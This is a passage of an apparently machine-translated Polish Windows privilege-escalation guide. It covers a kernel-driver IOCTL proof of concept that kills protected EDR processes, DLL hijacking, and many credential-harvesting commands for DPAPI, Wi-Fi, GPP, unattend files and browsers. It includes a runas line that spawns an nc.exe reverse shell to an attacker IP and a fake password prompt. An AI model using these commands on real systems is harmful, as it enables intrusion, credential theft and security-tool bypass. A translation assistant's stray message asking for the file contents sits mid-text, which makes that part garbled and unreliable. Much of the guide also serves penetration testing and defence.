Jeśli sterownik udostępnia arbitralny kernel read/write primitive (częste w źle zaprojektowanych handlerach IOCTL), możesz eskalować, kradnąc SYSTEM token bezpośrednio z pamięci jądra. Zobacz technikę krok‑po‑kroku tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Dla bugów race-condition, w których podatne wywołanie otwiera kontrolowaną przez atakującego ścieżkę Object Manager, celowe spowolnienie wyszukiwania (używając komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Prymitywy korupcji pamięci hive rejestru

Nowoczesne luki w hive pozwalają przygotować deterministyczne układy, nadużyć zapisywalnych potomków HKLM/HKU i przekształcić korupcję metadanych w kernel paged-pool overflows bez niestandardowego sterownika. Poznaj pełny łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Wykorzystywanie braku FILE_DEVICE_SECURE_OPEN na device objects (LPE + EDR kill)

Niektóre podpisane sterowniki firm trzecich tworzą swój device object z silnym SDDL przez IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tego flagu, secure DACL nie jest egzekwowane, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent, pozwalając dowolnemu nieuprzywilejowanemu użytkownikowi uzyskać uchwyt używając namespace path jak:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Gdy użytkownik może otworzyć urządzenie, uprzywilejowane IOCTLy udostępnione przez sterownik mogą być wykorzystane do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwrócenie uchwytów z pełnym dostępem do dowolnych procesów (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony surowy odczyt/zapis dysku (manipulacje offline, techniki trwałości przy rozruchu).
- Zakończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), umożliwiając AV/EDR kill z poziomu użytkownika przez kernel.

Minimalny wzorzec PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Środki zaradcze dla deweloperów
- Zawsze ustaw FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Waliduj kontekst wywołującego dla operacji uprzywilejowanych. Dodaj sprawdzenia PP/PPL przed zezwoleniem na zakończenie procesu lub zwracanie uchwytów.
- Ogranicz IOCTLs (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele pośredniczące zamiast bezpośrednich uprawnień jądra.

Pomysły wykrywania dla obrońców
- Monitoruj otwarcia w user-mode podejrzanych nazw urządzeń (e.g., \\ .\\amsdk*) i konkretne sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj listę zablokowanych sterowników Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych.

## PATH DLL Hijacking

Jeśli masz **write permissions inside a folder present on PATH** możesz być w stanie przejąć DLL ładowany przez proces i **escalate privileges**.

Sprawdź uprawnienia wszystkich folderów znajdujących się w PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Aby uzyskać więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Sieć

### Udziały
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### plik hosts

Sprawdź, czy w pliku hosts nie ma wpisanych na stałe innych znanych komputerów
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Sprawdź, czy z zewnątrz dostępne są **restricted services**
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reguły zapory

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(lista reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz dostęp jako użytkownik root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie zostaniesz zapytany przez GUI, czy `nc` powinno być dozwolone przez firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault przechowuje poświadczenia użytkownika dla serwerów, stron internetowych i innych programów, do których **Windows** może **automatycznie zalogować użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać tam swoje poświadczenia do Facebook, Twitter, Gmail itd., aby automatycznie logować się przez przeglądarki. Jednak tak nie jest.

Windows Vault przechowuje poświadczenia, których Windows może użyć do automatycznego logowania użytkowników, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń do uzyskania dostępu do zasobu** (serwera lub strony internetowej) **może korzystać z tego Credential Manager** i Windows Vault oraz używać dostarczonych poświadczeń zamiast wymagać od użytkowników ciągłego wpisywania nazwy użytkownika i hasła.

Jeśli aplikacje nie komunikują się z Credential Manager, nie sądzę, żeby mogły użyć poświadczeń dla danego zasobu. Dlatego jeśli twoja aplikacja chce korzystać z vault, powinna w jakiś sposób **komunikować się z the credential manager i zażądać poświadczeń dla tego zasobu** z domyślnego magazynu vault.

Użyj `cmdkey`, aby wyświetlić listę przechowywanych poświadczeń na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład uruchamia zdalny plik wykonywalny przez SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Użycie `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Należy zauważyć, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), lub [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, używaną przede wszystkim w systemie Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, aby znacząco zwiększyć entropię.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. W scenariuszach dotyczących szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Szyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu %APPDATA%\Microsoft\Protect\{SID}, gdzie {SID} reprezentuje [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, zazwyczaj składa się z 64 bajtów losowych danych. (Warto zauważyć, że dostęp do tego katalogu jest ograniczony, uniemożliwiając wylistowanie jego zawartości za pomocą polecenia `dir` w CMD, chociaż można je wylistować przez PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby to odszyfrować.

Pliki **poświadczeń chronione hasłem głównym** zwykle znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
Możesz **wyodrębnić wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli jesteś rootem).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

Poświadczenia PowerShell są często używane do zadań skryptowych i automatyzacji jako sposób wygodnego przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione przy użyciu DPAPI, co zwykle oznacza, że można je odszyfrować tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby odszyfrować poświadczenia PS z pliku, który je zawiera, możesz wykonać:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Możesz **wydobyć wiele DPAPI masterkeys** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Użytkownicy często używają aplikacji StickyNotes na stacjach roboczych z Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że to plik bazy danych. Ten plik znajduje się pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i przeanalizować.

### AppCmd.exe

**Uwaga: aby odzyskać hasła z AppCmd.exe, musisz być Administratorem i uruchomić program na poziomie High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\  
Jeżeli ten plik istnieje, możliwe, że pewne **credentials** zostały skonfigurowane i mogą zostać **odzyskane**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Informacja z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Poświadczenia)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty — klucze hostów SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Prywatne klucze SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc należy sprawdzić, czy nie ma tam nic interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany zaszyfrowany, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby automatycznie uruchamiała się przy starcie, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Próbowałem stworzyć klucze ssh, dodać je przy użyciu `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania asymetrycznego kluczem.

### Pliki bezobsługowe
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz także wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia chmurowe
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### Zbuforowane hasło GPP

Dawniej istniała funkcja umożliwiająca wdrożenie niestandardowych kont lokalnych administratorów na grupie maszyn za pomocą Group Policy Preferences (GPP). Jednak ta metoda miała poważne luki bezpieczeństwa. Po pierwsze, Group Policy Objects (GPOs), przechowywane jako pliki XML w SYSVOL, mogły być dostępne dla dowolnego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne ryzyko, ponieważ mogło pozwolić użytkownikom na uzyskanie podwyższonych uprawnień.

Aby złagodzić to ryzyko, opracowano funkcję skanującą lokalnie zbuforowane pliki GPP zawierające pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, co pomaga w identyfikacji i usunięciu tej luki bezpieczeństwa.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Używanie crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN dane uwierzytelniające
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o credentials

Zawsze możesz **poprosić użytkownika, aby wpisał swoje credentials, albo nawet credentials innego użytkownika**, jeśli uważasz, że może je znać (zwróć uwagę, że **poproszenie** klienta bezpośrednio o **credentials** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierające poświadczenia**

Znane pliki, które jakiś czas temu zawierały **hasła** w **postaci jawnej** lub w **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md. Please paste the file content here (or grant access to it). Once you provide it, I'll translate the relevant English text to Polish, preserving all markdown/html syntax, tags, paths and links as you requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Poświadczenia w RecycleBin

Powinieneś także sprawdzić RecycleBin, aby znaleźć w nim poświadczenia

Aby **odzyskać hasła** zapisane przez różne programy możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru z poświadczeniami**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić dbs, w których przechowywane są hasła z **Chrome or Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może niektóre **hasła są** tam przechowywane.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w systemie Windows, która umożliwia komunikację pomiędzy komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest identyfikowany przez class ID (CLSID) i każdy komponent udostępnia funkcjonalność za pośrednictwem jednego lub więcej interfejsów, identyfikowanych przez interface IDs (IIDs).

Klasy i interfejsy COM są zdefiniowane w rejestrze pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** odpowiednio. Ten klucz rejestru jest utworzony przez scalenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

W praktyce, jeśli uda ci się **nadpisać dowolny z DLL-ów**, które zostaną uruchomione, możesz **escalate privileges**, jeśli dana DLL zostanie uruchomiona przez innego użytkownika.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Szukaj zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia, które wyszukują passwords

